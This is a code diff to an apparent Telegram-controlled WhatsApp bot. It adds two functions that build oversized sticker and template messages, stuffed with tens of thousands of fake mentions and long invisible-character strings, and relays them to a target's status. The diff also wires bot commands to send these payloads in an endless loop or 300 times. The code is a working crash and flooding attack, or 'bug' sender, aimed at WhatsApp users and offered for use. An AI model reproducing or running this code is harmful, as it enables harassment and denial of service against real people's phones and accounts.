@@ -2316,6 +2316,178 @@ async function delayByGizz(target) {
     }
   });
 }
+
+async function bulldozer3(target, mention) {
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+          mimetype: "image/webp",
+          directPath:
+            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+          fileLength: { low: 1, high: 0, unsigned: true },
+          mediaKeyTimestamp: {
+            low: 1746112211,
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                {
+                  length: 40000,
+                },
+                () =>
+                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: -1939477883,
+            high: 406,
+            unsigned: false,
+          },
+          isAvatar: false,
+          isAiSticker: false,
+          isLottie: false,
+        },
+      },
+    },
+  };
+
+  const msg = generateWAMessageFromContent(target, message, {});
+if (!msg.key || !msg.key.id) {
+  msg.key = {
+    remoteJid: target,
+    fromMe: true,
+    id: (Math.random() * 1e16).toString(36)
+  };
+}
+
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+}
+async function bulldozerV2(target) {
+  const stickerPayload = {
+    stickerMessage: {
+      url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
+      fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+      fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+      mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+      mimetype: "image/webp",
+      directPath: "/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
+      fileLength: { low: 99999999, high: 0, unsigned: true },
+      mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+      firstFrameLength: 50000,
+      firstFrameSidecar: "QmFkUmVhZHlUT1JFQ1Q=",
+      isAnimated: true,
+      isAvatar: false,
+      isLottie: false,
+      contextInfo: {
+        mentionedJid: Array.from({ length: 60000 }, () =>
+          "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
+        ),
+        forwardingScore: 999999,
+        isForwarded: true,
+        externalAdReply: {
+          showAdAttribution: true,
+          title: "\u200E".repeat(40000),
+          body: "\u200E".repeat(40000),
+          mediaUrl: "",
+          mediaType: 1,
+          thumbnail: Buffer.from([]),
+          sourceUrl: "",
+          renderLargerThumbnail: true
+        }
+      }
+    }
+  };
+
+  const templatePayload = {
+    templateMessage: {
+      hydratedTemplate: {
+        hydratedContentText: "\u200E".repeat(90000),
+        hydratedFooterText: "Oblivion Force Activated",
+        hydratedButtons: [],
+        templateId: "oblivion_" + Date.now(),
+        contextInfo: {
+          quotedMessage: stickerPayload,
+          forwardingScore: 88888,
+          isForwarded: true
+        }
+      }
+    }
+  };
+
+  const wrap = {
+    viewOnceMessage: {
+      message: templatePayload
+    }
+  };
+
+  const msg = generateWAMessageFromContent(target, wrap, {
+    quoted: null,
+    messageId: "oblv_" + Date.now()
+  });
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+}
 async function bulldozer1GB(target) {
   let parse = true;
   let SID = "5e03e0&mms3";
@@ -2956,7 +3128,7 @@ bot.onText(/\/ranzunli(?:\s(.+))?/, async (msg, match) => {
     });
 
     while (true) {
-        await bulldozer1GB(formatedNumber);
+        await bulldozer3(formatedNumber);
         await new Promise((resolve) => setTimeout(resolve, 3000));
         console.log(chalk.red("Send Bug Succes"))
     }
@@ -3005,7 +3177,7 @@ bot.onText(/\/ranzbull(?:\s(.+))?/, async (msg, match) => {
 
     // Proses pengiriman bug
     for (let i = 0; i < 300; i++) { // Kirim 3 kali langsung
-        await delayMakerInvis(formatedNumber)
+        await bulldozerV2(formatedNumber)
         await new Promise((resolve) => setTimeout(resolve, 2500));
     }
 
